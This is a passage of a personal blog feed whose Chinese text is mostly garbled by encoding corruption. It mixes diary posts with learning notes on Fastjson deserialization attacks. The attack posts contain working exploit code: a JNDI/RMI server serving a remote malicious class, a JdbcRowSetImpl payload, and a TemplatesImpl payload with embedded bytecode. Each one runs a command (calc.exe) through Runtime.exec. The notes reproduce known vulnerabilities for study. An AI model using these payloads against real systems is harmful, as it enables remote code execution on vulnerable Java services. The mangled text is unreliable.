    <content type="html"><![CDATA[<p>å…¶å®è¶Šé•¿å¤§å°±å‘ç°æƒ³è¦åœ¨ä¸€ä¸ªé¢†åŸŸåšå¥½ï¼Œè¦ä»˜å‡ºå¾ˆå¤šã€‚æœ€è¿‘å­¦ä¹ è™½ç„¶éƒ½æ˜¯å¤ä¹ ä¹‹å‰å­¦çš„ï¼Œä½†æ˜¯è¿˜æ˜¯å­¦äº†å°±å¿˜ï¼Œæ‰‹æ•²ä»£ç è¿˜æ˜¯ä¸å¤Ÿç†Ÿç»ƒã€‚å¯èƒ½ç¡®å®æœ‰äº›å°ç¬¨ï¼Œæ„Ÿè§‰èº«è¾¹çš„äººä¸€æ¬¡å°±å­¦ä¼šäº†ã€‚ç®—äº†ä¹Ÿä¸è¯´è¿™äº›é”¤å¤´ä¸§æ°”çš„è¯ï¼Œç»§ç»­å†²ï¼æ¯•ç«Ÿcuitï¼Œå¤œæ™š11ç‚¹å¤šçš„é“¶å…´å¤§é“ä¸æ­¢åªæœ‰ä½ ã€‚å°±ä¸èŠ±å¤šæ—¶é—´å†™äº†ã€‚å°±æ˜¯ç®€å•è®°å½•ä¸€ä¸‹ã€‚é¡ºä¾¿åæ§½ï¼Œå¯†ç å­¦è€å¸ˆè®²è¯¾çœŸçš„å·®åŠ²ã€‚ï¼ˆæˆ‘ä¸¥é‡æ€€ç–‘ä»–åˆ°åº•ä¼šä¸ä¼šï¼ï¼ï¼ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091323190.jpg"></p><p>è¿˜æœ‰è¿˜æœ‰ï¼ï¼ä»Šå¤©ç¬¬ä¸€æ¬¡åƒè¿™ä¸ªä¸œè¥¿ï¼Œæ²¡æƒ³åˆ°è¿˜æŒºå¥½åƒã€‚ä¸‹æ¬¡å›å»è®©å©†å©†ç»™æˆ‘åšè¿™é“èœï¼ï¼ï¼ˆå§‘ä¸”ç§°å®ƒç‹®å­å¤´åŒ…è›‹ã€‚å“ˆå“ˆå“ˆå“ˆå“ˆï¼‰<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091325433.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®è´å¥³ç”ŸèŠ‚å¿«ä¹</title>
    <link href="/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/"/>
    <url>/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/</url>
    
    <content type="html"><![CDATA[<p>ä¸€å¹´ä¸€åº¦çš„ä¸‰å…«èŠ‚åˆ°å•¦ã€‚å“¦è±æˆ‘å¾—å…ˆå»ä¸Šå¯†ç å­¦äº†ã€‚å¾…ä¼šåœ¨æ¥å¨å¨ä¸¤å¥ã€‚<br>ç–«æƒ…å¤ªéš¾å—äº†ï¼Œå¦‚æœä¸æ˜¯ç–«æƒ…å¯èƒ½æˆ‘ç°åœ¨åœ¨è·Ÿå®è´ç©ã€‚ä»Šå¤©è·Ÿå®è´ç‚¹äº†æ¯å¥¶èŒ¶ï¼Œçœ‹æ ·å­è¿˜æŒºå¼€å¿ƒå¾—ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091319667.png" alt="202203081824384"></p><p>ç¦»æ¸…æ˜èŠ‚è¶Šæ¥è¶Šè¿‘ï¼Œæ„Ÿè§‰å¥½æœŸå¾…ä¸€èµ·å»å³¨çœ‰å±±ã€‚<br>æœ€ååœ¨ç¥å®è´å¥³ç”ŸèŠ‚å¿«ä¹å“Ÿã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å­¦ç”Ÿæ—¶ä»£çš„çˆ±æƒ…</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ±æƒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆJdbcRowSetImplï¼‰</title>
    <link href="/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjsonï¼ˆJNDI-RMI"><a href="#Fastjsonï¼ˆJNDI-RMI" class="headerlink" title="Fastjsonï¼ˆJNDI+RMI)"></a>Fastjsonï¼ˆJNDI+RMI)</h1><p>ğŸ*çš„ï¼ŒçœŸå°±æ½œå…¥JNDIæ˜¯ä¸è¡Œã€‚æ‰‹æ•²è¿˜æ˜¯æ•²ä¸å¯¹ï¼<br>æœ‰ä¸€è¯´ä¸€æ‰¿è®¤äº†ï¼Œè¦ä¸ç„¶ä¸ä¼šå¼„è¿™ä¹ˆä¹…ï¼Œå°±æ˜¯è¿˜æ˜¯æ²¡æœ‰ææ‡‚JNDIæ³¨å…¥ã€‚</p><h2 id="JNDIServer"><a href="#JNDIServer" class="headerlink" title="JNDIServer"></a>JNDIServer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exloit&quot;</span>,<br>                <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:80/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className, String factory, String factoryLocation)<br></code></pre></td></tr></table></figure><p>å‚æ•°1ï¼š<code>className</code> - è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å</p><p>å‚æ•°2ï¼š<code>classFactory</code> - åŠ è½½çš„<code>class</code>ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°</p><p>å‚æ•°3ï¼š<code>classFactoryLocation</code> - æä¾›<code>classes</code>æ•°æ®çš„åœ°å€å¯ä»¥æ˜¯<code>file/ftp/http</code>åè®®</p><p><strong>å¹¶ä¸”æˆ‘ä»¬è¿™é‡Œæ³¨æ„åˆ°Factoryå‘½åå¿…é¡»å¸¦ä¸ŠåŒ…çš„è·¯å¾„ï¼ˆå°±æ˜¯éœ€è¦å®Œæ•´çš„è·¯å¾„ï¼‰ã€‚</strong>ä¸ç„¶æ— æ³•å¤ç°æˆåŠŸã€‚<br><strong>å½“ç„¶ï¼Œè¦æŠŠä¸€ä¸ªå¯¹è±¡ç»‘å®šåˆ°<code>RMIæ³¨å†Œè¡¨</code>ä¸­ï¼Œè¿™ä¸ªå¯¹è±¡éœ€è¦ç»§æ‰¿<code>UnicastRemoteObject</code>ï¼Œä½†æ˜¯<code>Reference</code>æ²¡æœ‰ç»§æ‰¿å®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°è£…ä¸€ä¸‹å®ƒï¼Œç”¨ <code>ReferenceWrapper</code> åŒ…è£¹ä¸€ä¸‹<code>Reference</code>å®ä¾‹å¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥å°†å…¶ç»‘å®šåˆ°<code>RMIæ³¨å†Œè¡¨</code></strong></p><p>å½“å»è®¿é—®127.0.0.1&#x2F;Exloit.classçš„æ—¶å€™æ‰¾ä¸åˆ°ã€‚å°±ä¼šå»è®¿é—®æˆ‘ä»¬è®¾ç½®çš„è·¯å¾„å»æ‰§è¡Œæ¶æ„ç±»ä»£ç ã€‚<strong>å¹¶ä¸”ä¼šè°ƒç”¨å…¶ä¸­çš„æ— å‚æ„é€ å‡½æ•°</strong>ï¼Œè¿˜å¯ä»¥åˆ©ç”¨javaçš„staticä»£ç å—æ¥å†™æ¶æ„ä»£ç ï¼Œstaticä»£ç å—çš„ä»£ç åœ¨classæ–‡ä»¶è¢«åŠ è½½è¿‡åå°±ä¼šç«‹å³æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ã€‚</p><h1 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h1><p>è¿™é‡Œå°±è¯´å…³é”®éƒ¨åˆ†ã€‚å› ä¸ºè¿™ä¸ªå¾ˆå¤šæ¨¡å—çš„å‡½æ•°è°ƒè¯•ä¸è¿›å»ã€‚<br>åœ¨ä¹‹å‰<strong>fastjsonåŸºäºTemplatesImplè§¦å‘é“¾ä¸­</strong>ï¼Œæˆ‘ä»¬ç›´æ¥ä»è¿™é‡Œè¿›å»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535811.png" alt="QQæˆªå›¾20220308151631"></p><p>ä¼šè°ƒè¯•å¾ˆä¹…å¾ˆä¹…å¾ˆä¹…ç›´æ¥æ¥åˆ°è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535859.png" alt="QQæˆªå›¾20220308151706"></p><p>å»ºè®®ç›´æ¥è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ã€‚ä½ç½®å¦‚ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535460.png" alt="QQæˆªå›¾20220308151802"></p><p>è·Ÿè¿›è¿™é‡Œåˆçœ‹ä¸åˆ°ã€‚</p><p>å»ºè®®ç›´æ¥æ–­ç‚¹æ¥åˆ°è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535780.png" alt="QQæˆªå›¾20220308152204"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535322.png" alt="QQæˆªå›¾20220308152226"></p><p>è·Ÿè¿›ã€‚**connect()**ã€‚æ¥åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹this.getDataSourceName()çš„å€¼ã€‚å‘ç°å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081524409.png" alt="QQæˆªå›¾20220308152417"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535007.png" alt="QQæˆªå›¾20220308152402"></p><p>æ‰€ä»¥å°±é€ æˆäº†JNDIæ³¨å…¥ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/xsw6a.Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br><span class="hljs-comment">//        JSON.parseObject(payload);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¶æ„ç±»"><a href="#æ¶æ„ç±»" class="headerlink" title="æ¶æ„ç±»"></a>æ¶æ„ç±»</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®°å¾—è‡ªå·±å¼€å¯ä¸€ä¸ª127.0.0.1:80çš„æœåŠ¡ï¼Œå¹¶ä¸”å°†æ¶æ„ç±».classæ”¾å…¥è¿›å»ã€‚æˆ‘çš„ç”µè„‘æœ¬æœºpython3å¯ä»¥å¼€å¯æœåŠ¡ä½†æ˜¯å¼¹ä¸å‡ºè®¡ç®—å™¨ã€‚ä¸çŸ¥é“åŸå› ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆTemplateImplï¼‰</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjsonï¼ˆTemplatesImpï¼‰"><a href="#Fastjsonï¼ˆTemplatesImpï¼‰" class="headerlink" title="Fastjsonï¼ˆTemplatesImpï¼‰"></a>Fastjsonï¼ˆTemplatesImpï¼‰</h1><p>ä¹‹å‰å¥½å‡ ç¯‡æ–‡ç« éƒ½æ˜¯åŸºäºè§¦å‘æ¶æ„ç±»ï¼ˆTemplatesImpï¼‰è°ƒç”¨getteræ–¹æ³•ã€‚é‚£ä¹ˆåœ¨ä¹‹å‰åˆ†æçš„<strong>Fastjson</strong>ä¸­åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨getteræ–¹æ³•ã€‚æ‰€ä»¥å°±å¯ä»¥è¿èµ·æ¥äº†ã€‚</p><p><strong>åŸºäº1.2.22-1.2.24ç‰ˆæœ¬</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>å¼„äº†æˆ‘åŠå¤©ï¼Œæ‰å‘ç°è‡ªå·±çš„å¼¹è®¡ç®—å™¨çš„å‘½ä»¤è¾“é”™äº†ã€‚æˆ‘æ— è¯­äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String s=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMeHN3NmEvRmFzdGpzb25FaXZsOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQARRmFzdGpzb25FaXZsLmphdmEMAAgACQcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAEnhzdzZhL0Zhc3Rqc29uRWl2bAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABsACAAcAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(s, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h2><p>å›å¿†ï¼šåœ¨<strong>TemplateImpl</strong>ä¸­æˆ‘ä»¬æ³¨æ„çš„ç‚¹å°±æ˜¯é‚£ä¸‰ä¸ªå‚æ•°å€¼ï¼Œä¸¤ä¸ªä¸ä¸ºç©ºï¼Œä¸€ä¸ªè¦å®ä¾‹åŒ–ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112551.png" alt="QQæˆªå›¾20220307193542"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071936060.png" alt="QQæˆªå›¾20220307193608"></p><p>å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™é‡Œçš„<strong>name</strong> ã€<strong>bytecode</strong>éƒ½æœ‰è‡ªå·±setæ–¹æ³•ï¼Œè™½ç„¶æ˜¯ç§æœ‰å±æ€§ä½†æ˜¯ä¹Ÿå¯ä»¥èµ‹å€¼ã€‚<br>ä½†æ˜¯ä¸ç¢°å·§è¿™é‡Œçš„<strong>tfactory</strong>æ²¡æœ‰è‡ªå·±çš„setæ–¹æ³•ã€‚<br>ä½†æ˜¯ç¢°å·§çš„æ˜¯fastjsonä¸­</p><p><strong>å¦‚æœå¼€å¯äº†ï¼ŒFeature.SupportNonPublicFieldã€‚åœ¨fastjsonååºåˆ—åŒ–çš„æ—¶å€™ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ— å‚æ„é€ å‡½æ•°ï¼Œå¦‚æœå­˜åœ¨çš„è¯å°±ä¼šç›´æ¥å»è°ƒç”¨setteræ–¹æ³•ç»™å±æ€§èµ‹å€¼ï¼Œè€Œæ²¡æœ‰ setter æ–¹æ³•çš„å±æ€§å¦‚æœå¼€å¯äº†Feature.SupportNonPublicFieldçš„è¯ä¹Ÿä¼šé€šè¿‡åå°„å»ç»™å±æ€§èµ‹å€¼ã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112058.png" alt="QQæˆªå›¾20220307205404"></p><p>è¿™é‡Œåˆ¤æ–­äº†<strong>SupportNonPublicField</strong></p><p>å®åœ¨ä¸æƒ³æˆªå›¾ã€‚æœ€åå°±ä¼šè°ƒç”¨åˆ°getO..æ–¹æ³•ã€‚è§¦å‘TemplatesImplé“¾ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112931.png" alt="QQæˆªå›¾20220307211055"></p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI+LDAP+JRMP+JNDIï¼ˆäº†è§£ï¼‰</title>
    <link href="/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/"/>
    <url>/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p><strong>ä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚</strong></p><p>è¿™é‡Œæˆ‘ä»¬è¦æ¸…æ¥šï¼Œåœ¨å®¢æˆ·ç«¯ä»æœåŠ¡ç«¯ä¼ é€’éƒ½æ˜¯ä»¥å­—èŠ‚åºåˆ—ä¼ é€’çš„ï¼Œæœ€ç»ˆä¸€å®šä¼šç»è¿‡ååºåˆ—åŒ–ã€‚</p><h1 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h1><p>ä¸€ç§åœ¨ä½¿ç”¨RMIçš„è¿‡ç¨‹ä¸­çš„åè®®ï¼Œå¯ä»¥ç»„ç»‡æ•°æ®æ ¼å¼é€šè¿‡TCPè¿›è¡Œä¼ è¾“ï¼Œä»è€Œè¾¾åˆ°RMIã€‚</p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>ä¸€ç§javaå‘½åå’Œç›®å½•çš„æ¥å£ã€‚è€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“rmiå’Œldapä¹Ÿæ˜¯ç›®å½•æœåŠ¡ç³»ç»Ÿã€‚JNDIçš„æ¥å£ä¸‹æœ‰è®¸å¤šç›®å½•ç³»ç»ŸæœåŠ¡ï¼ˆrmiã€ldapï¼‰ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡åç§°ç­‰å»æ‰¾åˆ°ç›¸å…³çš„å¯¹è±¡ï¼Œå¹¶ä¸”æŠŠå®ƒä¸‹è½½åˆ°å®¢æˆ·ç«¯ã€‚</p><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>åŠ¨æ€åŠ 